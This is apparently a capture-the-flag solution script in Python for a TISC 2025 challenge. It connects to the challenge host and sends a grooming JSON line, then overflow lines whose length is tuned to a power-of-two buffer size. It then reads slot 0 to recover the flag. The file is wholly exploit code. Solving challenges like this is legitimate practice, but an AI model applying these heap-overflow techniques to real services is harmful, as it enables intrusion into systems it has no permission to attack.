#!/usr/bin/env python3
import json
import socket
import time
import sys
import random

HOST = ('chals.tisc25.ctf.sg', 51728)

# Known good frame from notes, but we will vary digit width of the 44 leading elements
TAIL_A = [65, 11, 0]
TAIL_B = [75, 37, 0]

# Build JSON line with control of comma spacing and trailing spaces
# We construct the string manually to know the exact length.
def build_line(vals, comma_space=0, trail_spaces=0):
    # comma_space=0 or 1; keep other formatting standard
    sep = ',' + (' ' * comma_space)
    body = '[' + sep.join(str(x) for x in vals) + ']'
    line = '{"slot": 1, "data": ' + body + '}' + (' ' * trail_spaces)
    return line

# Compute next power-of-two capacity for a given used length
# The driver builds a dynamic buffer with doubling; we target cap=256 here.
def next_pow2(x):
    p = 1
    while p < x:
        p <<= 1
    return p

# Try to pick a small set of candidates that produce cap-used in [4..15]
# for a target cap of 256.
def select_candidates():
    candidates = []
    for digit_w, val in [(1,0), (2,10), (3,100)]:
        base_vals = [val] * 44
        for tail in (TAIL_A, TAIL_B):
            arr = base_vals + tail
            for comma_space in (0,1):
                # Try trail spaces from 0..40 (kept small), prefilter by length
                for tr in range(0, 81):
                    s = build_line(arr, comma_space, tr)
                    L = len(s)
                    cap = next_pow2(L+1)  # +1 for possible extra NUL in builder
                    if cap not in (128, 256, 512):
                        continue
                    delta = cap - L
                    if 4 <= delta <= 15:
                        candidates.append((digit_w, val, tail, comma_space, tr, L, cap, delta, s))
    # sort by cap descending (prefer 256) then by delta
    candidates.sort(key=lambda x: (-x[6], x[7]))
    # dedupe by (digit_w, comma_space, tr, cap, delta)
    uniq = []
    seen = set()
    for c in candidates:
        key = (c[0], c[3], c[4], c[6], c[7])
        if key in seen:
            continue
        seen.add(key)
        uniq.append(c)
        if len(uniq) >= 6:
            break
    return uniq


def send_sequence(second_line_str, third_line_str):
    # First payload fixed, then second tuned overflow, then third tuned follow-up, then probe slot 0
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(6)
    try:
        s.connect(HOST)
        resps = []
        # 1) grooming
        line1 = json.dumps({"slot": 1, "data": [69,2,0]}) + '\n'
        s.sendall(line1.encode())
        try:
            resps.append(s.recv(16384))
        except socket.timeout:
            resps.append(b'')
        time.sleep(0.15)
        # 2) the tuned overflow candidate
        s.sendall((second_line_str + '\n').encode())
        try:
            resps.append(s.recv(16384))
        except socket.timeout:
            resps.append(b'')
        time.sleep(0.15)
        # 3) tuned follow-up line
        s.sendall((third_line_str + '\n').encode())
        try:
            resps.append(s.recv(16384))
        except socket.timeout:
            resps.append(b'')
        time.sleep(0.15)
        # 4) immediate slot 0 probe
        s.sendall((json.dumps({"slot":0}) + '\n').encode())
        try:
            resps.append(s.recv(16384))
        except socket.timeout:
            resps.append(b'')
        print('SEQ RESP:', b' | '.join(x[:160] for x in resps))
        # quick decode
        for r in resps:
            if b'TISC{' in r:
                print(r)
                return True
            if b'Slot 0 contains:' in r and b'[' in r and b']' in r:
                try:
                    arr_bytes = r[r.index(b'['): r.index(b']')+1]
                    vals = json.loads(arr_bytes)
                    sflag = ''.join(chr(x) for x in vals if isinstance(x,int) and 0 <= x < 256 and x != 0)
                    print('DECODED:', sflag)
                    if 'TISC{' in sflag:
                        return True
                except Exception:
                    pass
        return False
    finally:
        try:
            s.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        s.close()


def main():
    cands = select_candidates()
    print('Selected candidates (len cap delta):', [(c[5], c[6], c[7]) for c in cands])
    ok = False
    for c in cands:
        _, val, tail, comma_space, tr, L, cap, delta, sline2 = c
        print(f'Trying: val={val} tail={tail} comma_space={comma_space} tr={tr} L={L} cap={cap} delta={delta}')
        # Build third line with same base digit width and formatting
        base_vals = [val] * 44
        sline3 = build_line(base_vals + [75,37,0], comma_space, tr)
        ok = send_sequence(sline2, sline3)
        if ok:
            print('SUCCESS with tuned line')
            break
        time.sleep(0.4 + random.random()*0.4)
    sys.exit(0 if ok else 1)

if __name__ == '__main__':
    main()
